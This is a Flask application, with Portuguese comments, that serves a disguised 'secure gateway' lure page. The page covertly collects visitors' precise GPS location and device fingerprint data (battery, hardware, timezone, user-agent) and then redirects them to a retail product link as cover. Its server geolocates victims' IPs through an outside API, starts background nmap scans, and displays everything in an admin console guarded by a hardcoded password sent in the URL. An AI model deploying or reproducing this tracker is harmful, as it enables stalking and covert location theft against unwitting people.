from flask import Flask, render_template_string, request, jsonify
import datetime
import urllib.request
import json
import nmap
import threading
from user_agents import parse

app = Flask(__name__)

# Buffers de armazenamento em memória RAM (Mainframe Core)
registros_gps = []
registros_ip = []

# Credenciais de Acesso ao Console
SENHA_ADMIN = "123123"

# Página HTML de Captura Teleométrica Avançada (Payload Unificado)
HTML_CAPTURA = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE SYSTEM GATEWAY - IDENTIFICATION DIVISION</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #000084; color: #55FF55; text-align: center; margin-top: 15%; }
        .box { border: 2px dashed #FF5555; padding: 20px; display: inline-block; background: #000042; }
        h2 { color: #FFFF55; text-transform: uppercase; font-size: 16px; }
        p { color: #FFFFFF; font-size: 13px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>IDENTIFICATION DIVISION.</h2>
        <p>PROGRAM-ID. SECURE-HANDSHAKE-V3.</p>
        <p>>> ESTABELECENDO TUNELAMENTO SEGURO E TELEMETRIA... <<</p>
    </div>
    <script>
        async function executarPayloadCompleto(lat = null, lon = null, precisao = null) {
            let infoHardware = {
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                platform: navigator.platform || 'N/A',
                language: navigator.language || 'N/A',
                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
                cookieEnabled: navigator.cookieEnabled ? 'SIM' : 'NÃO',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : 'DESCONHECIDO',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                bateria: 'N/A',
                resolucqao: window.screen.width + 'x' + window.screen.height,
                colorDepth: window.screen.colorDepth + ' bits'
            };

            if (navigator.getBattery) {
                try {
                    let bat = await navigator.getBattery();
                    infoHardware.bateria = Math.round(bat.level * 100) + '% (' + (bat.charging ? 'CARREGANDO' : 'DESCARGA') + ')';
                } catch(e) {}
            }

            const payload = {
                hw: infoHardware,
                latitude: lat,
                longitude: lon,
                precisao: precisao
            };

            try {
                await fetch('/salvar-payload-total', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch(e) {
                console.error("Erro no dispatch:", e);
            } finally {
                window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
            }
        }

        function lidarComSucesso(position) {
            executarPayloadCompleto(
                position.coords.latitude,
                position.coords.longitude,
                position.coords.accuracy
            );
        }

        function lidarComErro(error) {
            console.warn("GPS Negado ou Indisponível: " + error.message);
            executarPayloadCompleto(null, null, null);
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(lidarComSucesso, lidarComErro, {
                enableHighAccuracy: true,
                timeout: 7000,
                maximumAge: 0
            });
        } else {
            executarPayloadCompleto(null, null, null);
        }
    </script>
</body>
</html>
"""

# Painel Administrativo Mainframe COBOL Estilo Raiz Azulão
HTML_PAINEL = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>MAINFRAME SECURITY CONSOLE // COBOL V3.0</title>
    <style>
        body { 
            font-family: 'Courier New', Courier, monospace; 
            margin: 0; 
            padding: 20px; 
            background: #000084; 
            color: #FFFFFF; 
        }
        h2, h3 { 
            color: #FF5555; 
            text-transform: uppercase; 
            border-bottom: 2px dashed #FF5555;
            padding-bottom: 5px;
        }
        .container { max-width: 1450px; margin: auto; }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            background: #000042; 
            margin-top: 15px; 
            margin-bottom: 30px;
            border: 2px solid #FF5555;
        }
        th, td { 
            border: 1px solid #FF5555; 
            padding: 8px 10px; 
            text-align: left; 
            font-size: 11px;
        }
        th { 
            background: #000021; 
            color: #FFFF55; 
            font-weight: bold;
        }
        tr:hover { background: #000063; }
        a { color: #55FFFF; text-decoration: underline; font-weight: bold; }
        a:hover { color: #FF5555; }
        .aviso-vazio { color: #FF8888; text-align: center; font-style: italic; }
        .system-info { font-size: 11px; color: #55FF55; margin-bottom: 20px; }
        .cobol-code { color: #FFFF55; font-size: 10px; background: #000021; padding: 10px; border: 1px dashed #55FF55; margin-bottom: 15px; }
        .badge-porta { background: #005500; color: #AAFFAA; padding: 2px 4px; border: 1px solid #55FF55; font-size: 10px; display: inline-block; margin: 2px; }
        .badge-info { color: #55FFFF; }
    </style>
</head>
<body>
<div class="container">
    <h2>=== MAINFRAME SECURITY CONSOLE // PROCEDURE DIVISION V3.0 ===</h2>
    <div class="cobol-code">
        000100 IDENTIFICATION DIVISION.<br>
        000200 PROGRAM-ID. MONITOR-TELEMETRIA.<br>
        000300 ENVIRONMENT DIVISION. CONFIGURATION SECTION.<br>
        000400 DATA DIVISION. WORKING-STORAGE SECTION.<br>
        000500 77 STATUS-CONSOLE PIC X(20) VALUE 'ONLINE-ACTIVE'.<br>
        000600 77 AUTO-REFRESH-TIMER PIC 9(2) VALUE 5.
    </div>
    <div class="system-info">
        STATUS: ONLINE | AUTO-REFRESH: 5s | NMAP ENGINE: ACTIVE | SECURE PROTOCOL: TCP/IP
    </div>

    <h3>[ TABELA 1: CAPTURAS DE GEOLOCALIZAÇÃO GPS // 01 REGS-GPS ]</h3>
    <p>Total de Registros GPS Capturados: {{ gps|length }}</p>
    <table>
        <tr>
            <th>DATA / HORA</th>
            <th>IP DE ORIGEM</th>
            <th>LATITUDE / LONGITUDE</th>
            <th>PRECISÃO (METROS)</th>
            <th>EXTERNAL MAP LINK</th>
        </tr>
        {% for r in gps %}
        <tr>
            <td>{{ r.data }}</td>
            <td>{{ r.ip }}</td>
            <td>{{ r.lat }}, {{ r.lon }}</td>
            <td>{{ r.precisao }}m</td>
            <td><a href="{{ r.maps }}" target="_blank">[ABRIR GOOGLE MAPS]</a></td>
        </tr>
        {% else %}
        <tr><td colspan="5" class="aviso-vazio">>> 01 CONDITIONAL: NENHUM DADO DE GPS CAPTURADO NESTE CLUSTER <<</td></tr>
        {% endfor %}
    </table>

    <h3>[ TABELA 2: INTELIGÊNCIA DE REDE, HARDWARE, NMAP & USER-AGENT // 02 REGS-TELEMETRY ]</h3>
    <p>Total de Registros de Hardware/Rede: {{ ips|length }}</p>
    <table>
        <tr>
            <th>DATA / HORA</th>
            <th>IP / GEO / REDE</th>
            <th>ISP / PROVEDOR</th>
            <th>HARDWARE & DISPOSITIVO</th>
            <th>AMBIENTE & NAVEGADOR (USER-AGENT)</th>
            <th>PORTAS ABERTAS (NMAP LAB SCAN)</th>
        </tr>
        {% for r in ips %}
        <tr>
            <td>{{ r.data }}</td>
            <td>
                {{ r.ip }}<br>
                <span style="color: #FFFF55;">{{ r.cidade }}/{{ r.estado }} ({{ r.pais }})</span><br>
                Link: <span class="badge-info">{{ r.hw.connectionType }}</span>
            </td>
            <td>{{ r.isp }}</td>
            <td>
                CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
                RAM Aprox: {{ r.hw.deviceMemory }} GB<br>
                Bateria: {{ r.hw.bateria }}<br>
                Resolução: {{ r.hw.resolucqao }} ({{ r.hw.colorDepth }})<br>
                Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
                Fuso: {{ r.hw.timezone }}
            </td>
            <td>
                <b>OS:</b> {{ r.ua_info.os }}<br>
                <b>Browser:</b> {{ r.ua_info.browser }}<br>
                <b>Device:</b> {{ r.ua_info.device }}<br>
                <b>Idioma:</b> {{ r.hw.language }}<br>
                <details style="margin-top: 4px;">
                    <summary style="cursor: pointer; color: #55FFFF;">Inspect User-Agent</summary>
                    <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
                </details>
            </td>
            <td>
                {% if r.portas %}
                    {% for p in r.portas %}
                        <span class="badge-porta">Porta {{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
                    {% endfor %}
                {% else %}
                    <span style="color: #FFAAAA;">PERFORM NMAP-SCAN VARYING...</span>
                {% endif %}
            </td>
        </tr>
        {% else %}
        <tr><td colspan="6" class="aviso-vazio">>> 01 CONDITIONAL: NENHUM REGISTRO DE HARDWARE CAPTURADO <<</td></tr>
        {% endfor %}
    </table>
</div>

<script>
    // Auto-refresh rigoroso a cada 5 segundos preservando token de acesso (senha)
    setTimeout(function(){
        window.location.reload();
    }, 5000);
</script>
</body>
</html>
"""

def executar_nmap_background(registro_ref):
    """Executa varredura Nmap assíncrona orientada a objetos de rede"""
    try:
        nm = nmap.PortScanner()
        nm.scan('scanme.nmap.org', arguments='-p 22,80,443,3306,8080 --open -T4')
        
        portas_encontradas = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for p in lport:
                    estado = nm[host][proto][p]['state']
                    servico = nm[host][proto][p]['name']
                    portas_encontradas.append({"porta": p, "estado": estado, "servico": servico})
        
        registro_ref["portas"] = portas_encontradas
    except Exception as e:
        print(f"Erro na varredura Nmap: {e}")
        registro_ref["portas"] = [{"porta": "N/A", "estado": "blocked", "servico": "filtered"}]

@app.route('/')
def index():
    return render_template_string(HTML_CAPTURA)

@app.route('/salvar-payload-total', methods=['POST'])
def salvar_payload_total():
    dados = request.json or {}
    
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()
        
    user_agent_str = request.headers.get('User-Agent', 'Desconhecido')
    parsed_ua = parse(user_agent_str)
    ua_info = {
        "os": f"{parsed_ua.os.family} {parsed_ua.os.version_string}".strip(),
        "browser": f"{parsed_ua.browser.family} {parsed_ua.browser.version_string}".strip(),
        "device": f"{parsed_ua.device.brand or ''} {parsed_ua.device.model or ''} ({'Mobile' if parsed_ua.is_mobile else 'Tablet' if parsed_ua.is_tablet else 'PC'})".strip()
    }

    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Enriquecimento GeoIP via IP-API
    cidade, estado, pais, isp = "Desconhecido", "Desconhecido", "Desconhecido", "Desconhecido"
    try:
        if ip_cliente != "127.0.0.1" and ip_cliente != "localhost":
            url = f"http://ip-api.com/json/{ip_cliente}?lang=pt-BR"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as response:
                api_data = json.loads(response.read().decode())
                if api_data.get('status') == 'success':
                    cidade = api_data.get('city', 'Desconhecido')
                    estado = api_data.get('regionName', 'Desconhecido')
                    pais = api_data.get('country', 'Desconhecido')
                    isp = api_data.get('isp', 'Desconhecido')
    except Exception as e:
        print("Erro GeoIP:", e)

    # Extrai hardware do payload unificado
    hw = dados.get('hw', {})

    # Adiciona registro na Tabela de Inteligência de Rede e Hardware
    novo_registro_ip = {
        "data": agora,
        "ip": ip_cliente,
        "cidade": cidade,
        "estado": estado,
        "pais": pais,
        "isp": isp,
        "hw": hw,
        "ua_info": ua_info,
        "user_agent": user_agent_str,
        "portas": []
    }
    registros_ip.insert(0, novo_registro_ip)

    # Dispara Nmap em background thread
    t = threading.Thread(target=executar_nmap_background, args=(novo_registro_ip,))
    t.start()

    # Se a geolocalização GPS veio preenchida, adiciona na Tabela GPS
    lat = dados.get('latitude')
    lon = dados.get('longitude')
    precisao = dados.get('precisao')

    if lat is not None and lon is not None:
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        registros_gps.insert(0, {
            "data": agora,
            "ip": ip_cliente,
            "lat": lat,
            "lon": lon,
            "precisao": precisao,
            "maps": maps_link
        })

    return jsonify({"status": "sucesso", "payload": "processed"})

@app.route('/admin', methods=['GET'])
def admin():
    senha_informada = request.args.get('senha', '')
    if senha_informada != SENHA_ADMIN:
        return """
        <body style="font-family: 'Courier New'; background: #000042; color: #FF5555; text-align: center; margin-top: 15%;">
            <h2>004010 SECURITY EXCEPTION - ACCESS DENIED</h2>
            <p>AUTORIZAÇÃO REQUERIDA NA URL: <code>/admin?senha=SUA_SENHA</code></p>
        </body>
        """, 403
        
    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)